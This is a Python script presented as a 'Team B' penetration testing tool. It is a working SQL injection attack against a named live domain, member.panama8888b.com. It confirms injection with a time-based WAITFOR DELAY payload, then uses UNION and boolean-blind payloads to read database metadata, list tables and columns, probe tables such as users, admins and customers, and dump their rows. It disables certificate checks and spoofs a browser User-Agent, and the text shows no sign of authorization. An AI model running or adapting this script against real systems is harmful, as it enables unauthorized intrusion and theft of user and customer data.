#!/usr/bin/env python3
"""
SQL Injection Testing Script for Panama8888b
Team B - Penetration Testing Tool
"""

import requests
import urllib.parse
import time
import sys
import json
from urllib3.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SQLInjector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def inject_query(self, payload, timeout=30):
        """Execute SQL injection payload"""
        try:
            encoded_payload = urllib.parse.quote(payload)
            url = f"{self.base_url}?v=25.1{encoded_payload}"
            
            start_time = time.time()
            response = self.session.get(url, timeout=timeout, verify=False)
            elapsed = time.time() - start_time
            
            return response.text, elapsed, response.status_code
        except Exception as e:
            return None, 0, 0
    
    def time_based_check(self, delay=5):
        """Time-based SQL injection verification"""
        print(f"[*] Testing time-based SQL injection with {delay}s delay...")
        
        # Normal request for baseline
        normal_payload = ""
        _, normal_time, _ = self.inject_query(normal_payload)
        
        # Injection payload
        injection_payload = f")) WAITFOR DELAY '0:0:{delay}' --"
        _, injection_time, _ = self.inject_query(injection_payload)
        
        print(f"[*] Normal request time: {normal_time:.2f}s")
        print(f"[*] Injection request time: {injection_time:.2f}s")
        
        if injection_time > normal_time + (delay - 1):
            print("[+] Time-based SQL injection CONFIRMED!")
            return True
        else:
            print("[-] Time-based SQL injection not detected")
            return False
    
    def extract_data_union(self, query):
        """Extract data using UNION-based injection"""
        payload = f")) UNION SELECT ({query}) --"
        content, elapsed, status = self.inject_query(payload)
        
        if content and status == 200:
            # Try to extract meaningful data from response
            return content
        return None
    
    def extract_data_boolean(self, query, max_length=100):
        """Extract data using boolean-based blind injection"""
        result = ""
        print(f"[*] Extracting data using boolean-based injection...")
        
        for i in range(1, max_length + 1):
            found_char = False
            for ascii_val in range(32, 127):  # Printable ASCII characters
                test_query = f"ASCII(SUBSTRING(({query}), {i}, 1)) = {ascii_val}"
                payload = f")) AND ({test_query}) --"
                
                content, elapsed, status = self.inject_query(payload, timeout=10)
                
                if content and len(content) > 1000:  # Assuming normal response is longer
                    result += chr(ascii_val)
                    print(f"[+] Found character {i}: {chr(ascii_val)}")
                    found_char = True
                    break
            
            if not found_char:
                break
                
        return result if result else None
    
    def get_database_info(self):
        """Get basic database information"""
        print("\n[+] Gathering database information...")
        
        queries = {
            'version': '@@version',
            'database': 'DB_NAME()',
            'user': 'USER_NAME()',
            'server': '@@servername'
        }
        
        results = {}
        for key, query in queries.items():
            print(f"[*] Getting {key}...")
            
            # Try UNION-based first
            result = self.extract_data_union(query)
            if not result:
                # Fallback to boolean-based
                result = self.extract_data_boolean(query, 50)
            
            results[key] = result
            if result:
                print(f"[+] {key}: {result[:100]}...")
            else:
                print(f"[-] Failed to get {key}")
        
        return results
    
    def get_tables(self):
        """Get table names"""
        print("\n[+] Getting table names...")
        
        # Try different queries for table names
        queries = [
            "SELECT name FROM sysobjects WHERE xtype='U'",
            "SELECT table_name FROM information_schema.tables",
            "SELECT TOP 10 name FROM sysobjects WHERE xtype='U'"
        ]
        
        for query in queries:
            print(f"[*] Trying query: {query}")
            result = self.extract_data_union(query)
            if result:
                print(f"[+] Tables found: {result[:200]}...")
                return result
        
        print("[-] Could not retrieve table names")
        return None
    
    def get_columns(self, table_name):
        """Get column names for a table"""
        print(f"\n[+] Getting columns for table: {table_name}")
        
        queries = [
            f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'",
            f"SELECT TOP 10 column_name FROM information_schema.columns WHERE table_name='{table_name}'"
        ]
        
        for query in queries:
            result = self.extract_data_union(query)
            if result:
                print(f"[+] Columns found: {result[:200]}...")
                return result
        
        print(f"[-] Could not retrieve columns for {table_name}")
        return None
    
    def dump_table_data(self, table_name, columns=None, limit=5):
        """Dump data from a table"""
        print(f"\n[+] Dumping data from table: {table_name}")
        
        if columns:
            # Join columns with separator
            cols = "+CHAR(124)+".join(columns)  # Using | as separator
            query = f"SELECT TOP {limit} {cols} FROM {table_name}"
        else:
            query = f"SELECT TOP {limit} * FROM {table_name}"
        
        result = self.extract_data_union(query)
        if result:
            print(f"[+] Data from {table_name}: {result[:300]}...")
            return result
        else:
            print(f"[-] Could not dump data from {table_name}")
            return None
    
    def test_common_tables(self):
        """Test common table names"""
        print("\n[+] Testing common table names...")
        
        common_tables = [
            'users', 'user', 'admin', 'admins', 'members', 'member',
            'players', 'player', 'accounts', 'account', 'login',
            'customers', 'customer', 'staff', 'employees'
        ]
        
        found_tables = []
        
        for table in common_tables:
            print(f"[*] Testing table: {table}")
            
            # Test if table exists
            payload = f")) AND (SELECT COUNT(*) FROM {table}) >= 0 --"
            content, elapsed, status = self.inject_query(payload, timeout=10)
            
            if content and len(content) > 1000:  # Assuming normal response
                print(f"[+] Table '{table}' exists!")
                found_tables.append(table)
                
                # Try to get some data
                self.dump_table_data(table, limit=3)
            else:
                print(f"[-] Table '{table}' not found or accessible")
        
        return found_tables
    
    def comprehensive_test(self):
        """Run comprehensive SQL injection test"""
        print("="*60)
        print("SQL INJECTION COMPREHENSIVE TEST")
        print("Target:", self.base_url)
        print("="*60)
        
        # Step 1: Verify time-based injection
        if not self.time_based_check():
            print("[-] Time-based injection failed. Exiting...")
            return False
        
        # Step 2: Get database information
        db_info = self.get_database_info()
        
        # Step 3: Try to get table names
        tables = self.get_tables()
        
        # Step 4: Test common table names
        found_tables = self.test_common_tables()
        
        # Step 5: Try to dump data from found tables
        for table in found_tables[:3]:  # Limit to first 3 tables
            columns = self.get_columns(table)
            if columns:
                self.dump_table_data(table, limit=5)
        
        print("\n" + "="*60)
        print("TEST COMPLETED")
        print("="*60)
        
        return True

def main():
    """Main function"""
    target_url = "https://member.panama8888b.com/public/js/v2/app.js"
    
    print("SQL Injection Testing Tool - Team B")
    print(f"Target: {target_url}")
    print("-" * 50)
    
    injector = SQLInjector(target_url)
    
    try:
        injector.comprehensive_test()
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during testing: {e}")

if __name__ == "__main__":
    main()